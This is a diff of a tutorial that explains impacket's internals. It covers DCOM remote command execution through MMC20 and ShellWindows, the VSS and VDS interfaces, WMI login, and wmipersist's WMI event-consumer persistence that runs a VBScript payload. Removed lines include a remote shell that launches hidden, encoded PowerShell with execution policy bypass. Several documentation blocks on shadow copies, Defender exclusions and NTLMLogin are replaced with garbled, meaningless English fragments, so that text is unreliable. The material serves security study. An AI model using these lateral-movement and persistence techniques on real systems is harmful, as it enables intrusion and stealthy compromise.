-                resp = iMMC.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
-                pQuit = iMMC.GetIDsOfNames(('Quit',))[0]
-            else:
-                logging.fatal('Invalid object %s' % self.__dcomObject)
-                return
+                ......
 
             iDocument = IDispatch(self.getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
 
             if self.__dcomObject == 'MMC20':
+                # (5) MMC20: Document.ActiveView.ExecuteShellCommand(...) runs the command
                 resp = iDocument.GetIDsOfNames(('ActiveView',))
                 resp = iDocument.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
 
@@ -4515,278 +4086,17 @@ class DCOMEXEC:
                 pExecuteShellCommand = iActiveView.GetIDsOfNames(('ExecuteShellCommand',))[0]
                 self.shell = RemoteShellMMC20(self.__share, (iMMC, pQuit), (iActiveView, pExecuteShellCommand), smbConnection, self.__shell_type, silentCommand)
             else:
+                # (5) ShellWindows/ShellBrowserWindow: Document.Application.ShellExecute(...) runs the command
                 resp = iDocument.GetIDsOfNames(('Application',))
                 resp = iDocument.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
 
                 iActiveView = IDispatch(self.getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
                 pExecuteShellCommand = iActiveView.GetIDsOfNames(('ShellExecute',))[0]
                 self.shell = RemoteShell(self.__share, (iMMC, pQuit), (iActiveView, pExecuteShellCommand), smbConnection, self.__shell_type, silentCommand)
-
-            if self.__command != ' ':
-                try:
-                    self.shell.onecmd(self.__command)
-                except TypeError:
-                    if not silentCommand:
-                        raise
-                if self.shell is not None:
-                    self.shell.do_exit('')
-            else:
-                self.shell.cmdloop()
-        except  (Exception, KeyboardInterrupt) as e:
-            if logging.getLogger().level == logging.DEBUG:
-                import traceback
-                traceback.print_exc()
-            if self.shell is not None:
-                self.shell.do_exit('')
-            logging.error(str(e))
-            if smbConnection is not None:
-                smbConnection.logoff()
-            dcom.disconnect()
-            sys.stdout.flush()
-            sys.exit(1)
-
-        if smbConnection is not None:
-            smbConnection.logoff()
-        dcom.disconnect()
-
-class RemoteShell(cmd.Cmd):
-    def __init__(self, share, quit, executeShellCommand, smbConnection, shell_type, silentCommand=False):
-        cmd.Cmd.__init__(self)
-        self._share = share
-        self._output = '\\' + OUTPUT_FILENAME
-        self.__outputBuffer = ''
-        self._shell = 'cmd.exe'
-        self.__shell_type = shell_type
-        self.__pwsh = 'powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc '
-        self.__quit = quit
-        self._executeShellCommand = executeShellCommand
-        self.__transferClient = smbConnection
-        self._silentCommand = silentCommand
-        self._pwd = 'C:\\windows\\system32'
-        self._noOutput = False
-        self.intro = '[!] Launching semi-interactive shell - Careful what you execute\n[!] Press help for extra shell commands'
-
-        # We don't wanna deal with timeouts from now on.
-        if self.__transferClient is not None:
-            self.__transferClient.setTimeout(100000)
-            self.do_cd('\\')
-        else:
-            self._noOutput = True
-
-    def do_shell(self, s):
-        os.system(s)
-
-    def do_help(self, line):
-        print("""
- lcd {path}                 - changes the current local directory to {path}
- exit                       - terminates the server process (and this session)
- lput {src_file, dst_path}   - uploads a local file to the dst_path (dst_path = default current directory)
- lget {file}                 - downloads pathname to the current local dir
- ! {cmd}                    - executes a local shell cmd
-""")
-
-    def do_lcd(self, s):
-        if s == '':
-            print(os.getcwd())
-        else:
-            try:
-                os.chdir(s)
-            except Exception as e:
-                logging.error(str(e))
-
-    def do_lget(self, src_path):
-        try:
-            import ntpath
-            newPath = ntpath.normpath(ntpath.join(self._pwd, src_path))
-            drive, tail = ntpath.splitdrive(newPath)
-            filename = ntpath.basename(tail)
-            fh = open(filename,'wb')
-            logging.info("Downloading %s\\%s" % (drive, tail))
-            self.__transferClient.getFile(drive[:-1]+'$', tail, fh.write)
-            fh.close()
-        except Exception as e:
-            logging.error(str(e))
-            os.remove(filename)
-            pass
-
-    def do_lput(self, s):
-        try:
-            params = s.split(' ')
-            if len(params) > 1:
-                src_path = params[0]
-                dst_path = params[1]
-            elif len(params) == 1:
-                src_path = params[0]
-                dst_path = ''
-
-            src_file = os.path.basename(src_path)
-            fh = open(src_path, 'rb')
-            dst_path = dst_path.replace('/','\\')
-            import ntpath
-            pathname = ntpath.join(ntpath.join(self._pwd, dst_path), src_file)
-            drive, tail = ntpath.splitdrive(pathname)
-            logging.info("Uploading %s to %s" % (src_file, pathname))
-            self.__transferClient.putFile(drive[:-1]+'$', tail, fh.read)
-            fh.close()
-        except Exception as e:
-            logging.critical(str(e))
-            pass
-
-    def do_exit(self, s):
-        dispParams = DISPPARAMS(None, False)
-        dispParams['rgvarg'] = NULL
-        dispParams['rgdispidNamedArgs'] = NULL
-        dispParams['cArgs'] = 0
-        dispParams['cNamedArgs'] = 0
-
-        self.__quit[0].Invoke(self.__quit[1], 0x409, DISPATCH_METHOD, dispParams,
-                                             0, [], [])
-        return True
-
-    def do_EOF(self, s):
-        print()
-        return self.do_exit(s)
-
-    def emptyline(self):
-        return False
-
-    def do_cd(self, s):
-        self.execute_remote('cd ' + s)
-        if len(self.__outputBuffer.strip('\r\n')) > 0:
-            print(self.__outputBuffer)
-            self.__outputBuffer = ''
-        else:
-            if PY2:
-                self._pwd = ntpath.normpath(ntpath.join(self._pwd, s.decode(sys.stdin.encoding)))
-            else:
-                self._pwd = ntpath.normpath(ntpath.join(self._pwd, s))
-            self.execute_remote('cd ')
-            self._pwd = self.__outputBuffer.strip('\r\n')
-            self.prompt = (self._pwd + '>')
-            if self.__shell_type == 'powershell':
-                    self.prompt = 'PS ' + self.prompt + ' '
-            self.__outputBuffer = ''
-
-    def default(self, line):
-        # Let's try to guess if the user is trying to change drive
-        if len(line) == 2 and line[1] == ':':
-            # Execute the command and see if the drive is valid
-            self.execute_remote(line)
-            if len(self.__outputBuffer.strip('\r\n')) > 0:
-                # Something went wrong
-                print(self.__outputBuffer)
-                self.__outputBuffer = ''
-            else:
-                # Drive valid, now we should get the current path
-                self._pwd = line
-                self.execute_remote('cd ')
-                self._pwd = self.__outputBuffer.strip('\r\n')
-                self.prompt = (self._pwd + '>')
-                if self.__shell_type == 'powershell':
-                    self.prompt = 'PS ' + self.prompt + ' '
-                self.__outputBuffer = ''
-        else:
-            if line != '':
-                self.send_data(line)
-
-    def get_output(self):
-        def output_callback(data):
-            try:
-                self.__outputBuffer += data.decode(CODEC)
-            except UnicodeDecodeError:
-                logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
-                              'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute dcomexec.py '
-                              'again with -codec and the corresponding codec')
-                self.__outputBuffer += data.decode(CODEC, errors='replace')
-
-        if self._noOutput is True:
-            self.__outputBuffer = ''
-            return
-
-        while True:
-            try:
-                self.__transferClient.getFile(self._share, self._output, output_callback)
-                break
-            except Exception as e:
-                if str(e).find('STATUS_SHARING_VIOLATION') >=0:
-                    # Output not finished, let's wait
-                    time.sleep(1)
-                    pass
-                elif str(e).find('Broken') >= 0:
-                    # The SMB Connection might have timed out, let's try reconnecting
-                    logging.debug('Connection broken, trying to recreate it')
-                    self.__transferClient.reconnect()
-                    return self.get_output()
-        self.__transferClient.deleteFile(self._share, self._output)
-
-    def execute_remote(self, data, shell_type='cmd'):
-        if self._silentCommand is True:
-            self._shell = data.split()[0]
-            command = ' '.join(data.split()[1:])
-        else:
-            if shell_type == 'powershell':
-                data = '$ProgressPreference="SilentlyContinue";' + data
-                data = self.__pwsh + b64encode(data.encode('utf-16le')).decode()
-            command = '/Q /c ' + data
-
-        if self._noOutput is False:
-            command += ' 1> ' + '\\\\127.0.0.1\\%s' % self._share + self._output + ' 2>&1'
-
-        logging.debug('Executing: %s' % command)
-
-        dispParams = DISPPARAMS(None, False)
-        dispParams['rgdispidNamedArgs'] = NULL
-        dispParams['cArgs'] = 5
-        dispParams['cNamedArgs'] = 0
-        arg0 = VARIANT(None, False)
-        arg0['clSize'] = 5
-        arg0['vt'] = VARENUM.VT_BSTR
-        arg0['_varUnion']['tag'] = VARENUM.VT_BSTR
-        arg0['_varUnion']['bstrVal']['asData'] = self._shell
-
-        arg1 = VARIANT(None, False)
-        arg1['clSize'] = 5
-        arg1['vt'] = VARENUM.VT_BSTR
-        arg1['_varUnion']['tag'] = VARENUM.VT_BSTR
-        if PY3:
-            arg1['_varUnion']['bstrVal']['asData'] = command
-        else:
-            arg1['_varUnion']['bstrVal']['asData'] = command.decode(sys.stdin.encoding)
-
-        arg2 = VARIANT(None, False)
-        arg2['clSize'] = 5
-        arg2['vt'] = VARENUM.VT_BSTR
-        arg2['_varUnion']['tag'] = VARENUM.VT_BSTR
-        arg2['_varUnion']['bstrVal']['asData'] = self._pwd
-
-        arg3 = VARIANT(None, False)
-        arg3['clSize'] = 5
-        arg3['vt'] = VARENUM.VT_BSTR
-        arg3['_varUnion']['tag'] = VARENUM.VT_BSTR
-        arg3['_varUnion']['bstrVal']['asData'] = ''
-
-        arg4 = VARIANT(None, False)
-        arg4['clSize'] = 5
-        arg4['vt'] = VARENUM.VT_BSTR
-        arg4['_varUnion']['tag'] = VARENUM.VT_BSTR
-        arg4['_varUnion']['bstrVal']['asData'] = '0'
-        dispParams['rgvarg'].append(arg4)
-        dispParams['rgvarg'].append(arg3)
-        dispParams['rgvarg'].append(arg2)
-        dispParams['rgvarg'].append(arg1)
-        dispParams['rgvarg'].append(arg0)
-
-        #print(dispParams.dump())
-
-        self._executeShellCommand[0].Invoke(self._executeShellCommand[1], 0x409, DISPATCH_METHOD, dispParams,
-                                            0, [], [])
-        self.get_output()
-
-    def send_data(self, data):
-        self.execute_remote(data, self.__shell_type)
-        print(self.__outputBuffer)
-        self.__outputBuffer = ''
+            ......
 ```
+
+> Excerpt note: the OBJREF dispatch in `getInterface` and the activation / property-chain / command-execution paths of the three DCOM components in `run()` are kept. The ~300-line `RemoteShell` / `RemoteShellMMC20` semi-interactive shell implementation in the dcomexec source (SMB file read/write for output retrieval, codec handling, prompt management) is unrelated to the teaching point and omitted here — see examples/dcomexec.py for the full implementation.
 
 0x409 is the US-English locale ID (LCID).
 
@@ -4858,24 +4168,24 @@ Snapshot: the point in time at which the shadow copy is made.
 Like snapshotting a VM, this snapshots a system volume — attackers use it to extract ntds.dit, execute commands and so on.
 
 ```
-卷影副本创建过程
-若要创建卷影副本，请求程序、编写程序和提供程序将执行以下操作：
-请求程序要求卷影复制服务枚举编写程序，收集编写程序元数据，并准备创建卷影副本。
-每个编写程序都会为需要备份的组件和数据存储创建 XML 描述，并将其提供给卷影复制服务。 编写器还定义了用于所有组件的还原方法。 卷影复制服务向请求程序提供编写程序的描述，而请求程序则选择要备份的组件。
-卷影复制服务通知所有编写程序准备数据以进行卷影复制。
-每个编写程序都会根据需要准备数据，例如完成所有未结束事务、滚动（rolling，截断/归档）事务日志和刷新缓存。 当数据准备好进行卷影复制时，编写程序将通知卷影复制服务。
-卷影复制服务通知编写程序将应用程序写入 I/O 请求暂时冻结几秒钟（仍然可以执行读取 I/O 请求），创建卷的卷影副本需要这几秒的时间。 应用程序冻结的时间不允许超过 60 秒。 卷影复制服务刷新文件系统缓冲区，然后冻结文件系统，从而确保正确记录文件系统元数据，并以一致的顺序写入要进行卷影复制的数据。
-卷影复制服务通知提供程序创建卷影副本。 卷影副本创建周期不超过 10 秒，在此期间，对文件系统的所有写入 I/O 请求都将保持冻结状态。
-卷影复制服务释放文件系统写入 I/O 请求。
-VSS 通知编写程序解除冻结应用程序写入 I/O 请求。 此时，应用程序可以继续将数据写入正在进行卷影复制的磁盘
+
+
+enumerates
+asgroup XML used forallgroupmethod thengroup
+all
+allrolling/log
+ entry I/O can I/O not 60 entry
+ not 10 inthisall entry I/O
+releases entry I/O
+VSS entry I/O thiscan entryin
 ```
 
 ![How the Volume Shadow Copy Service works](https://learn.microsoft.com/zh-cn/windows-server/storage/file-server/media/volume-shadow-copy-service/ee923636.1c481a14-d6bc-4796-a3ff-8c6e2174749b(ws.10).jpg)
 
 ```
-卷影副本和支持卷影副本的卷：客户端获取的第一个接口是IVssSnapshotMgmt 接口。客户端调用 IVssSnapshotMgmt::QueryVolumesSupportedForSnasphots（原文如此，微软文档中即为此拼写）方法来获取可以进行卷影复制的卷的集合。服务器必须响应一个IVssEnumMgmtObject 接口，客户端可以在该接口上调用方法来遍历集合。客户端调用 IVssSnapshotMgmt::QuerySnapshotsByVolume 获取已存在于指定卷上的卷影副本集合。服务器必须响应一个 IVssEnumObject 接口，客户端可以在该接口上调用方法来遍历集合。客户端调用 IVssSnapshotMgmt::GetProviderMgmtInterface 方法获取IVssDifferentialSoftwareSnapshotMgmt 接口。服务器必须响应一个 IVssDifferentialSoftwareSnapshotMgmt 接口，客户端可以在该接口上调用方法来管理卷影副本存储关联。
+clientobtainsIVssSnapshotMgmt client IVssSnapshotMgmt::QueryVolumesSupportedForSnasphotsthisasthismethod toobtainscanservermustIVssEnumMgmtObject clientcanintheonmethod toclient IVssSnapshotMgmt::QuerySnapshotsByVolume obtainsinspecifiedonservermust IVssEnumObject clientcanintheonmethod toclient IVssSnapshotMgmt::GetProviderMgmtInterface methodobtainsIVssDifferentialSoftwareSnapshotMgmt servermust IVssDifferentialSoftwareSnapshotMgmt clientcanintheonmethod to
 
-卷影副本存储关联：用于管理卷影副本存储关联的接口是通过 IVssSnapshotMgmt::GetProviderMgmtInterface 获取的。客户端调用 IVssDifferentialSoftwareSnapshotMgmt::QueryVolumesSupportedForDiffArea 方法来获取可用于存储卷影副本差异数据的卷集合。服务器必须响应一个 IVssEnumMgmtObject 接口，客户端可以在该接口上调用方法来遍历集合。客户端调用 IVssDifferentialSoftwareSnapshotMgmt::QueryDiffAreasForVolume 以获取已存在的卷影副本存储关联的集合，以存储特定原始卷的卷影副本差异数据. 服务器必须响应一个 IVssEnumMgmtObject 接口，客户端可以在该接口上调用方法来遍历集合。客户端调用 IVssDifferentialSoftwareSnapshotMgmt::QueryDiffAreasOnVolume 以获取用于在特定卷上存储差异数据的卷影副本存储关联的集合。服务器必须响应一个 IVssEnumMgmtObject 接口，客户端可以在该接口上调用方法来遍历集合。
+used for IVssSnapshotMgmt::GetProviderMgmtInterface obtainsclient IVssDifferentialSoftwareSnapshotMgmt::QueryVolumesSupportedForDiffArea method toobtainsused forservermust IVssEnumMgmtObject clientcanintheonmethod toclient IVssDifferentialSoftwareSnapshotMgmt::QueryDiffAreasForVolume obtainsin. servermust IVssEnumMgmtObject clientcanintheonmethod toclient IVssDifferentialSoftwareSnapshotMgmt::QueryDiffAreasOnVolume obtainsused forinonservermust IVssEnumMgmtObject clientcanintheonmethod to
 ```
 
 The module first defines the CLSIDs of IVssSnapshotMgmt and friends plus the data structures the shadow-copy protocol needs (VSS_ID etc.)
@@ -4940,6 +4250,7 @@ class IVdsService(IRemUnknown2):
         IRemUnknown2.__init__(self, interface)
 
     def IsServiceReady(self):
+        # boilerplate pattern: request -> on error, fetch the response packet from the exception object (e.get_packet())
         request = IVdsService_IsServiceReady()
         request['ORPCthis'] = self.get_cinstance().get_ORPCthis()
         request['ORPCthis']['flags'] = 0
@@ -4949,28 +4260,17 @@ class IVdsService(IRemUnknown2):
             resp = e.get_packet()
         return resp 
 
-    def WaitForServiceReady(self):
-        request = IVdsService_WaitForServiceReady()
-        request['ORPCthis'] = self.get_cinstance().get_ORPCthis()
-        request['ORPCthis']['flags'] = 0
-        resp = self.request(request, uuid = self.get_iPid())
-        return resp 
-
-    def GetProperties(self):
-        request = IVdsService_GetProperties()
-        request['ORPCthis'] = self.get_cinstance().get_ORPCthis()
-        request['ORPCthis']['flags'] = 0
-        resp = self.request(request, uuid = self.get_iPid())
-        return resp 
+    ......
 
     def QueryProviders(self, masks):
+        # query providers: returns an enumerable IEnumVdsObject;
+        # each object enumerated afterwards is likewise an IRemUnknown2-derived interface
         request = IVdsService_QueryProviders()
         request['ORPCthis'] = self.get_cinstance().get_ORPCthis()
         request['ORPCthis']['flags'] = 0
         request['masks'] = masks
         resp = self.request(request, uuid = self.get_iPid())
         return IEnumVdsObject(INTERFACE(self.get_cinstance(), ''.join(resp['ppEnum']['abData']), self.get_ipidRemUnknown(), target = self.get_target()))
-
 ```
 
 #### 6.3.5 [MS-WMI] wmi.py
@@ -5111,11 +4411,11 @@ Another example: the Add method of the MSFT_MpPreference class in the Windows De
 
 ```c++
 uint32 Add(
-  [in] string  ExclusionPath[],          // 排除路径，允许管理员明确禁止扫描检查列出的任何路径
-  [in] string  ExclusionExtension[],     // 允许管理员明确禁止扫描检查列出的任何扩展
-  [in] string  ExclusionProcess[],       // 允许管理员明确禁止扫描检查列出的任何进程
-  [in] sint64  ThreatIDDefaultAction_Ids[],      // 检测到时不应对其采取默认操作的威胁 ID
-  [in] uint8   ThreatIDDefaultAction_Actions[],  // 对上述威胁采取的操作，顺序须与 Ids 中指定的顺序一致
+ [in] string ExclusionPath[], // output
+ [in] string ExclusionExtension[], // output
+ [in] string ExclusionProcess[], // output
+ [in] sint64 ThreatIDDefaultAction_Ids[], // not ID
+ [in] uint8 ThreatIDDefaultAction_Actions[], // onwith Ids specified
   [in] boolean Force
 );
 ```
@@ -5151,13 +4451,13 @@ Focus on NTLMLogin's parameters:
 
 ```mof
  HRESULT NTLMLogin(
-   [in, unique, string] LPWSTR wszNetworkResource：代表返回的 IWbemServices 对象所关联的服务器上的命名空间。此参数不得为 NULL
-   [in, unique, string] LPWSTR wszPreferredLocale,一个指向字符串的指针，该字符串必须以首选顺序指定语言环境值，以逗号分隔。如果客户端不提供它，服务器会创建一个特定于实现的默认列表
-   [in] long lFlags,必须为 0
-   [in] IWbemContext* pCtx,必须是指向IWbemContext 接口的指针，它必须包含客户端发送的附加信息。如果pCtx 为 NULL，则必须忽略该参数。
-   [out] IWbemServices** ppNamespace如果调用成功，ppNamespace 必须返回一个指向 IWbemServices接口指针的指针。当发生错误时，此参数必须设置为 NULL。
+ [in, unique, string] LPWSTR wszNetworkResourcereturns IWbemServices objectserveronthisnotas NULL
+ [in, unique, string] LPWSTR wszPreferredLocale,themustspecifiedifclientnotservercreates alist
+   [in] long lFlags,mustas 0
+ [in] IWbemContext* pCtx,mustIWbemContext mustcontainingclientinformationifpCtx as NULLthenmustthe
+ [out] IWbemServices** ppNamespaceifppNamespace mustreturns a IWbemServicesthismustsetsas NULL
  );
-为响应 IWbemLevel1Login::NTLMLogin 方法，服务器必须返回对应于 wszNetworkResource 参数的 IWbemServices 接口。当调用成功时，服务器必须创建一个 IWbemServices 对象，并将 wszPreferredLocale 存储在对象中。服务器必须在 NamespaceConnectionTable 中查找与 wszNetworkResource 对应的 NamespaceConnection 对象，并将其引用存储在 IWbemServices 对象中。服务器必须将 GrantedAccess 设置为命名空间安全描述符授予客户端的一组访问权限。请求本地化信息的所有后续 IWbemServices 方法调用必须以 wszPreferredLocale 中指定的语言返回信息。当首选语言环境为 NULL 时，服务器应该使用特定于实现的逻辑来决定语言环境。成功的方法执行必须使用 IWbemServices 接口指针填充 ppNamespace 参数，并且必须返回 WBEM_S_NO_ERROR。
+as IWbemLevel1Login::NTLMLogin methodservermustreturns wszNetworkResource IWbemServices servermustcreates a IWbemServices object wszPreferredLocale inobjectservermustin NamespaceConnectionTable with wszNetworkResource NamespaceConnection objectin IWbemServices objectservermust GrantedAccess setsasclientgroupinformationall IWbemServices methodmust wszPreferredLocale specifiedreturnsinformationas NULL serverthemethodmust IWbemServices padding ppNamespace mustreturns WBEM_S_NO_ERROR
 ```
 
 Here is the IWbemLevel1Login class's implementation of NTLMLogin:
@@ -5260,61 +4560,41 @@ For method invocation see examples/wmipersist.py: in REMOVE mode it deletes exis
 
 ```python
  if self.__options.action.upper() == 'REMOVE':
+            # removal: delete the four instance kinds one by one (Consumer / Filter / Timer / Binding)
             self.checkError('Removing ActiveScriptEventConsumer %s' % self.__options.name,
                             iWbemServices.DeleteInstance('ActiveScriptEventConsumer.Name="%s"' % self.__options.name))
+            ......   # __EventFilter, __IntervalTimerInstruction and __FilterToConsumerBinding removed the same way
 
-            self.checkError('Removing EventFilter EF_%s' % self.__options.name,
-                            iWbemServices.DeleteInstance('__EventFilter.Name="EF_%s"' % self.__options.name))
-
-            self.checkError('Removing IntervalTimerInstruction TI_%s' % self.__options.name,
-                            iWbemServices.DeleteInstance(
-                                '__IntervalTimerInstruction.TimerId="TI_%s"' % self.__options.name))
-
-            self.checkError('Removing FilterToConsumerBinding %s' % self.__options.name,
-                            iWbemServices.DeleteInstance(
-                                r'__FilterToConsumerBinding.Consumer="ActiveScriptEventConsumer.Name=\"%s\"",'
-                                r'Filter="__EventFilter.Name=\"EF_%s\""' % (
-                                self.__options.name, self.__options.name)))
         else:
+            # install: (1) GetObject fetches the class definition -> SpawnInstance derives an instance -> fill properties -> PutInstance writes it back
             activeScript, _ = iWbemServices.GetObject('ActiveScriptEventConsumer')
             activeScript = activeScript.SpawnInstance()
             activeScript.Name = self.__options.name
-            activeScript.ScriptingEngine = 'VBScript'
-            activeScript.CreatorSID = [1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0]
-            activeScript.ScriptText = options.vbs.read()
+            activeScript.ScriptingEngine = 'VBScript'          # VBScript as the event-triggered payload
+            activeScript.CreatorSID = [1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0]   # Creator SID
+            activeScript.ScriptText = options.vbs.read()       # the malicious VBS body
             self.checkError('Adding ActiveScriptEventConsumer %s'% self.__options.name, 
                 iWbemServices.PutInstance(activeScript.marshalMe()))
-        
-            if options.filter is not None:
-                eventFilter, _ = iWbemServices.GetObject('__EventFilter')
-                eventFilter = eventFilter.SpawnInstance()
-                eventFilter.Name = 'EF_%s' % self.__options.name
-                eventFilter.CreatorSID = [1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0]
-                eventFilter.Query = options.filter
-                eventFilter.QueryLanguage = 'WQL'
-                eventFilter.EventNamespace = r'root\cimv2'
-                self.checkError('Adding EventFilter EF_%s' % self.__options.name,
-                    iWbemServices.PutInstance(eventFilter.marshalMe()))
 
+            if options.filter is not None:
+                ......   # __EventFilter: the WQL query and its namespace root\cimv2
             else:
                 wmiTimer, _ = iWbemServices.GetObject('__IntervalTimerInstruction')
                 wmiTimer = wmiTimer.SpawnInstance()
                 wmiTimer.TimerId = 'TI_%s' % self.__options.name
-                wmiTimer.IntervalBetweenEvents = int(self.__options.timer)
-                #wmiTimer.SkipIfPassed = False
+                wmiTimer.IntervalBetweenEvents = int(self.__options.timer)    # timer interval
                 self.checkError('Adding IntervalTimerInstruction',
                     iWbemServices.PutInstance(wmiTimer.marshalMe()))
 
                 eventFilter,_ = iWbemServices.GetObject('__EventFilter')
                 eventFilter =  eventFilter.SpawnInstance()
                 eventFilter.Name = 'EF_%s' % self.__options.name
-                eventFilter.CreatorSID =  [1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0]
                 eventFilter.Query = 'select * from __TimerEvent where TimerID = "TI_%s" ' % self.__options.name
                 eventFilter.QueryLanguage = 'WQL'
                 eventFilter.EventNamespace = r'root\subscription'
-                self.checkError('Adding EventFilter EF_%s' % self.__options.name,
-                    iWbemServices.PutInstance(eventFilter.marshalMe()))
+                ......
 
+            # (2) bind Filter -> Consumer; when the event fires, the script runs
             filterBinding, _ = iWbemServices.GetObject('__FilterToConsumerBinding')
             filterBinding = filterBinding.SpawnInstance()
             filterBinding.Filter = '__EventFilter.Name="EF_%s"' % self.__options.name
@@ -5364,67 +4644,67 @@ That completes the wmi module.
 
 These are impacket's foundational modules — a quick pass is enough.
 
-### ICMP6.py
+### ICMP6.py — IPv6 Ping
 
 Implements ICMPv6 echo (ping) support for IPv6 hosts.
 
-### IP6_Address.py
+### IP6_Address.py — IPv6 Address Parsing
 
 IPv6 address parsing.
 
-### IP6.py
+### IP6.py — IPv6 Protocol
 
 IPv6 protocol support.
 
-### IP6_Extension_Headers.py
+### IP6_Extension_Headers.py — IPv6 Extension Headers
 
 IPv6 extension header support.
 
-### version.py
+### version.py — Version Information
 
 Prints the current impacket version.
 
-### Dot11Crypto.py
+### Dot11Crypto.py — 802.11 RC4 Encryption
 
 RC4 encryption/decryption.
 
-### Dot11KeyManager.py
+### Dot11KeyManager.py — 802.11 Key Manager
 
 802.11 (Wi-Fi) key manager support.
 
-### ImpactDecoder.py
+### ImpactDecoder.py — Network Protocol Decoder
 
 Convenient packet decoders for various network protocols.
 
-### ImpactPacket.py
+### ImpactPacket.py — Low-level Packet Codec
 
 The basic building blocks of network packet codecs — low-level codecs for various Internet protocols, for building packets programmatically.
 
-### NDP.py
+### NDP.py — IPv6 Neighbor Discovery
 
 Neighbor Discovery Protocol (NDP) support for IPv6.
 
-### cdp.py
+### cdp.py — Cisco Discovery Protocol
 
 CDP support. CDP (Cisco Discovery Protocol) is a proprietary Layer-2 protocol by Cisco running on most Cisco gear; Cisco devices use it to share OS version, IP address, hardware platform and related information with directly connected devices.
 
-### crypto.py
+### crypto.py — Generic Algorithms incl. AES-CMAC (SMB3 signing)
 
 Generic cryptographic check algorithms such as AES-CMAC (used for SMB3 signing etc.; distinct from krb5/crypto.py)
 
-### dhcp.py
+### dhcp.py — DHCP Protocol
 
 DHCP protocol support.
 
-### dns.py
+### dns.py — DNS Protocol
 
 DNS protocol support.
 
-### dot11.py
+### dot11.py — 802.11 Protocol
 
 802.11 (Wi-Fi) protocol support.
 
-### dpapi.py
+### dpapi.py — Windows Data Protection API (Chrome credential decryption)
 
 DPAPI support — the **Data Protection API**. DPAPI is widely used across Windows applications and subsystems: file encryption, storage of wireless passwords, Windows Credential Manager, Internet Explorer, Outlook, Skype, Windows CardSpace, Windows Vault, Google Chrome and more. It is simple to use, exposing just a couple of functions to encrypt and decrypt data: **CryptProtectData** and **CryptUnprotectData**.
 
@@ -5439,71 +4719,71 @@ System master key files live in %WINDIR%\System32\Microsoft\Protect\S-1-5-18\Use
 
 https://paper.seebug.org/1755/#2-windowsdpapi
 
-### eap.py
+### eap.py — 802.1X Authentication
 
 Wi-Fi 802.11 authentication protocol support.
 
-### ese.py
+### ese.py — NTDS.dit Database Parsing
 
 Parses NTDS.dit.
 
-### helper.py
+### helper.py — Basic Packet Data Types
 
 Basic packet data type definitions — bit, byte and friends.
 
-### hresult_errors.py
+### hresult_errors.py — Windows Error Code Catalog
 
 Windows error code catalog.
 
-### http.py
+### http.py — RPC over HTTP 401 Authentication
 
 HTTP 401 authentication support for RPC over HTTP v2.
 
-### mapi_constants.py
+### mapi_constants.py — Exchange MAPI Constants
 
 Exchange error codes and MAPI properties.
 
-### mqtt.py
+### mqtt.py — MQTT Protocol
 
 MQTT protocol support.
 
-### nmb.py
+### nmb.py — NetBIOS Name Service
 
 NetBIOS library.
 
-### smb3.py
+### smb3.py — SMB2/3 Protocol Implementation
 
 MS-SMB2 protocol implementation (SMB2 and SMB3)
 
-### smb3structs.py
+### smb3structs.py — SMB2/3 Data Structures
 
 SMB 2/3 protocol structures and constants [MS-SMB2].
 
-### smbconnection.py
+### smbconnection.py — SMB Connection Wrapper Class
 
 Wrapper class over SMB1/2/3 — the SMB connection implementation.
 
-### smbserver.py
+### smbserver.py — SMB Server
 
 SMB server implementation.
 
-### system_errors.py
+### system_errors.py — System Error Code Catalog
 
 System error code catalog.
 
-### tds.py
+### tds.py — SQL Server TDS Protocol
 
 SQL Server (TDS) protocol support.
 
-### uuid.py
+### uuid.py — UUID ↔ Binary Conversion
 
 Conversions between UUID and binary representations.
 
-### winregistry.py
+### winregistry.py — Windows Registry Parser
 
 Windows registry hive parser.
 
-### wps.py
+### wps.py — WPS / WSC Wireless Configuration
 
 WPS protocol support.
 
